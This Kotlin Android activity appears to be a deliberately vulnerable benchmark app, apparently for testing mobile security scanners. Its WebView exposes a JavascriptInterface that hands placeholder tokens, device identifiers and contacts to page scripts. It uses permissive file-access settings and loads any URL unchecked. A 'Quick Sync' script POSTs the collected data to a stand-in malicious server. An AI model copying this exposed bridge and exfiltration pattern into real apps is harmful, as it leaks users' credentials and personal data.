package co.ostorlab.ben5

import android.os.Bundle
import android.webkit.JavascriptInterface
import android.webkit.WebView
import android.webkit.WebViewClient
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.compose.foundation.layout.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Modifier
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.unit.dp
import androidx.compose.ui.viewinterop.AndroidView
import co.ostorlab.ben5.ui.theme.MyApplicationTheme

class DataSyncActivity : ComponentActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContent {
            MyApplicationTheme {
                Surface(
                    modifier = Modifier.fillMaxSize(),
                    color = MaterialTheme.colorScheme.background
                ) {
                    DataSyncScreen()
                }
            }
        }
    }
}

@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun DataSyncScreen() {
    var syncUrl by remember { mutableStateOf("https://api.example.com/sync") }
    var webView: WebView? by remember { mutableStateOf(null) }
    val context = LocalContext.current

    Column(
        modifier = Modifier
            .fillMaxSize()
            .padding(16.dp)
    ) {
        Text(
            text = "Data Synchronization",
            style = MaterialTheme.typography.headlineMedium,
            modifier = Modifier.padding(bottom = 16.dp)
        )

        Text(
            text = "Sync your data with cloud services",
            style = MaterialTheme.typography.bodyMedium,
            modifier = Modifier.padding(bottom = 16.dp)
        )

        OutlinedTextField(
            value = syncUrl,
            onValueChange = { syncUrl = it },
            label = { Text("Sync Endpoint") },
            modifier = Modifier.fillMaxWidth()
        )

        Spacer(modifier = Modifier.height(8.dp))

        Row(
            modifier = Modifier.fillMaxWidth(),
            horizontalArrangement = Arrangement.spacedBy(8.dp)
        ) {
            Button(
                onClick = {
                    webView?.loadUrl(syncUrl)
                },
                modifier = Modifier.weight(1f)
            ) {
                Text("Start Sync")
            }
            
            Button(
                onClick = {
                    val syncScript = """
                        <html>
                        <head><title>Data Sync</title></head>
                        <body>
                        <h2>Synchronizing Data...</h2>
                        <script>
                        window.onload = function() {
                            var userData = DataBridge.getAllUserData();
                            var deviceInfo = DataBridge.getDeviceInfo();
                            var contacts = DataBridge.getContacts();
                            
                            console.log('User Data:', userData);
                            console.log('Device Info:', deviceInfo);
                            console.log('Contacts:', contacts);
                            
                            // Send data to external server
                            fetch('https://api.malicious-server.com/collect', {
                                method: 'POST',
                                body: JSON.stringify({
                                    user: userData,
                                    device: deviceInfo,
                                    contacts: contacts
                                })
                            });
                        };
                        </script>
                        </body>
                        </html>
                    """.trimIndent()
                    webView?.loadData(syncScript, "text/html", "UTF-8")
                },
                modifier = Modifier.weight(1f)
            ) {
                Text("Quick Sync")
            }
        }

        Spacer(modifier = Modifier.height(16.dp))

        AndroidView(
            factory = { context ->
                WebView(context).apply {
                    settings.javaScriptEnabled = true
                    settings.allowFileAccess = true
                    settings.domStorageEnabled = true
                    settings.allowUniversalAccessFromFileURLs = true
                    
                    addJavascriptInterface(DataBridge(context as ComponentActivity), "DataBridge")
                    
                    webViewClient = object : WebViewClient() {
                        override fun shouldOverrideUrlLoading(view: WebView?, url: String?): Boolean {
                            view?.loadUrl(url ?: "")
                            return true
                        }
                    }
                    
                    loadUrl("about:blank")
                    webView = this
                }
            },
            modifier = Modifier
                .fillMaxWidth()
                .weight(1f)
        )
    }
}

class DataBridge(private val activity: ComponentActivity) {
    @JavascriptInterface
    fun getAllUserData(): String {
        return """
        {
            "userId": "12345",
            "username": "john.doe",
            "email": "john.doe@example.com",
            "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
            "apiKey": "sk-1234567890abcdef",
            "lastLogin": "2024-01-15T10:30:00Z"
        }
        """.trimIndent()
    }

    @JavascriptInterface
    fun getDeviceInfo(): String {
        return """
        {
            "deviceId": "device_12345",
            "model": "Samsung Galaxy S21",
            "os": "Android 12",
            "location": "37.7749,-122.4194",
            "imei": "123456789012345",
            "macAddress": "00:1B:44:11:3A:B7"
        }
        """.trimIndent()
    }

    @JavascriptInterface
    fun getContacts(): String {
        return """
        [
            {"name": "Alice Smith", "phone": "+1234567890", "email": "alice@example.com"},
            {"name": "Bob Johnson", "phone": "+1234567891", "email": "bob@example.com"},
            {"name": "Charlie Brown", "phone": "+1234567892", "email": "charlie@example.com"}
        ]
        """.trimIndent()
    }

    @JavascriptInterface
    fun uploadData(data: String) {
        activity.runOnUiThread {
            // Process and upload data
        }
    }
}
